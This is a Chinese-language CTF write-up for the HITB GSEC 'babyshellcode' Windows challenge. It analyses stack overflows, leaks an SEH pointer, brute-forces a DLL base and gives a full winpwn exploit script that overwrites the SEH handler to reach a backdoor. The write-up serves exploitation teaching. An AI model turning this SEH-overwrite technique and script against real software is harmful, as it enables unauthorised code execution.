# Windows pwn 栈题入门

## HITB GSEC babyshellcode

刚刚迈入windows大门，所以参考了下之前windows栈题目的wp自己动手调试一下。

远古栈溢出题目,先看看保护：

```bash
λ winchecksec babyshellcode.exe
Results for: babyshellcode.exe
Dynamic Base    : "Present"
ASLR            : "Present"
High Entropy VA : "NotPresent"
Force Integrity : "NotPresent"
Isolation       : "Present"
NX              : "Present"
SEH             : "Present"
CFG             : "Present"
RFG             : "NotPresent"
SafeSEH         : "NotPresent"
GS              : "Present"
Authenticode    : "NotPresent"
.NET            : "NotPresent"


C:\Users\secundanirn\Desktop\ctf\pwn\babyshellcode
λ winchecksec scmgr.dll
Results for: scmgr.dll
Dynamic Base    : "Present"
ASLR            : "Present"
High Entropy VA : "NotPresent"
Force Integrity : "NotPresent"
Isolation       : "Present"
NX              : "Present"
SEH             : "Present"
CFG             : "NotPresent"
RFG             : "NotPresent"
SafeSEH         : "NotPresent"
GS              : "Present"
Authenticode    : "NotPresent"
.NET            : "NotPresent"
```

这里winchecksec脚本并没有显示出safeSEH，不知道为啥。

### 分析程序

这个程序的逻辑还是很简单的，主要实现的功能就是运行用户输入的shellcode，其中shellcode存储在scmgr的堆数据段。

但是在运行前，程序会先将shellcode的第一个dword赋值成-1，也就是FFFFFFFFh，所以直接执行会抛出一个illegal instruction的异常。

同时这个函数是有漏洞的，在memcpy时没有检查len的大小，会造成一个栈溢出。

```c
if ( shellcode )
  {
    if ( guard )
    {
      v3 = (_DWORD *)shellcode->sc_addr;
      memcpy(Src, v3, shellcode->len);          // overflow
      *v3 = -1;                                 // sc err
    }
    ((void (__thiscall *)(int))shellcode->sc_addr)(shellcode->sc_addr);
    if ( guard )
      memcpy((void *)(*(&shellcode_list + index))->sc_addr, Src, (*(&shellcode_list + index))->len);
    result = 0;
  }
```

然后瞅一眼汇编，发现这个函数注册了SEH相关结构体

```assembly
.text:00401350                 push    ebp
.text:00401351                 mov     ebp, esp
.text:00401353                 push    0FFFFFFFEh
.text:00401355                 push    offset stru_403960
.text:0040135A                 push    offset __except_handler4
.text:0040135F                 mov     eax, large fs:0
.text:00401365                 push    eax
.text:00401366                 sub     esp, 70h
.text:00401369                 mov     eax, ___security_cookie
.text:0040136E                 xor     [ebp+ms_exc.registration.ScopeTable], eax
.text:00401371                 xor     eax, ebp
.text:00401373                 mov     [ebp+var_1C], eax
.text:00401376                 push    ebx
.text:00401377                 push    esi
.text:00401378                 push    edi
.text:00401379                 push    eax
.text:0040137A                 lea     eax, [ebp+ms_exc.registration]
.text:0040137D                 mov     large fs:0, eax
.text:00401383                 mov     [ebp+ms_exc.old_esp], esp
```

所以这个异常会被抛出给SEH来处理。

同时在main函数中也有一个栈溢出：

```c
 nameindex = 0;
  v4 = getchar();
  do
  {
    if ( v4 == 10 )
      break;
    name[nameindex++] = v4;
    v4 = getchar();
  }
  while ( nameindex != 300 );                   // ovflow
```

这里这个name存储在栈上，长度为16，很明显的栈溢出。

### 漏洞利用思路

既然有了栈溢出，那么直接覆盖返回地址不就行了？想的美，windows的栈和linux的栈差的很多，同时这个程序有GS保护，所以覆盖返回地址的方式不可行。

![windows栈帧](/Users/secundanirn/Desktop/学习相关/windows栈帧.jpg)

所以思路是覆盖SEH的handler指针，触发异常，劫持到目标地址上。

那么目标地址在哪里呢？

分析的时候就可以发现，在scmgrdll中内置了后门函数，同时scmgr没有开启safe SEH检查，直接跳到这里即可。

但是通过观察栈帧可以发现，在handler之前，有个next的指针，这里safe SEH和SEHOP会检查SEH链的完整性，所以说必须要泄漏一个合法的next。

那么现在万事具备只欠东风，只需要知道一个合法的SEH地址以及SCMGR中的函数地址即可完成利用

### 泄漏地址

利用main函数中name的栈溢出漏洞，可以泄漏出一个合法的SEH地址信息。

在setguard函数中，存在一个比较复杂的加密函数，该加密函数不可逆，其加密的第一个字段的值为scmgr基地址，所以可以通过正向爆破的方式猜出来实际地址信息。

### exp

```python
from winpwn import *
context.log_level = 'debug'
context.debugger = 'windbg'
io = process('.\\babyshellcode.exe')
def choice(c):
	io.recvuntil('Option:')
	io.sendline(str(c))
def add(sz,name,des,sc):
	choice(1)
	io.recvuntil('size:')
	io.sendline(str(sz))
	io.recvuntil('name:')
	io.sendline(name)
	io.recvuntil('tion:')
	io.sendline(des)
	io.recvuntil('shellcode:')
	io.sendline(sc)
def show():
	choice(2)
def delete(idx):
	choice(3)
	io.recvuntil('index:')
	io.sendline(str(idx))
def run(idx):
	choice(4)
	io.recvuntil('index:')
	io.sendline(str(idx))
def set(option):
    io.recvuntil('Option:\r\n')
    io.sendline('5')
    io.recvuntil('Option:\r\n')
    io.sendline(str(option))
    io.recvuntil('is ')
    check = io.recvline().split("-")[5][:8]
    check = int(check, 16)
    print("check: " + hex(check))
    get_shell = get_scmgr_base(check)
    return get_shell
def p():
	windbg.attach(io)
	pause()
def get_scmgr_base(check):
    for base in range(0x60000000, 0x80000000, 0x10000):
        #print(base)
        init_scmgr = base + 0x1090
        g_table = [init_scmgr]
        for i in range(31):
            init_scmgr = (init_scmgr * 69069) & 0xffffffff
            g_table.append(init_scmgr)
        g_index = 0
        v0 = (g_index-1) & 0x1f
        v2 = g_table[(g_index + 3) & 0x1f] ^ g_table[g_index] ^ (g_table[(g_index + 3) & 0x1f] >> 8)
        v1 = g_table[v0]
        v3 = g_table[(g_index + 10) & 0x1F]
        v4 = g_table[(g_index - 8) & 0x1F] ^ v3 ^ ((v3 ^ (32 * g_table[(g_index - 8) & 0x1F])) << 14)
        v4 = v4 & 0xffffffff
        g_table[g_index] = v2 ^ v4
        g_table[v0] = (v1 ^ v2 ^ v4 ^ ((v2 ^ (16 * (v1 ^ 4 * v4))) << 7)) & 0xffffffff
        g_index = (g_index - 1) & 0x1F
        if(g_table[g_index] == check):
            #print("base: " + hex(base))
            return base + 0x1100
def exp():
	p()
	io.recvuntil('at ')
	scbase = int(io.recv(8),16)
	name = 'a'*80
	io.recvuntil('name')
	io.sendline(name)
	io.recvuntil('a'*80)
	seh_next = u32(io.recv(4).ljust(4, '\x00'))
	seh_next = seh_next & 0xffffffff
	

	sys = set(1)
	print("scheap   --------------> " + hex(scbase))
	print("seh_next --------------> " + hex(seh_next))
	print("sys		--------------> " + hex(sys))
	io.sendline('aaaa')
	payload = 'a'*0x70 + p32(seh_next) + p32(sys) + p32(0)
	add(len(payload),'ssss','ssss',payload)
	run(0)
	io.interactive()
if __name__ == '__main__':
	exp()

```

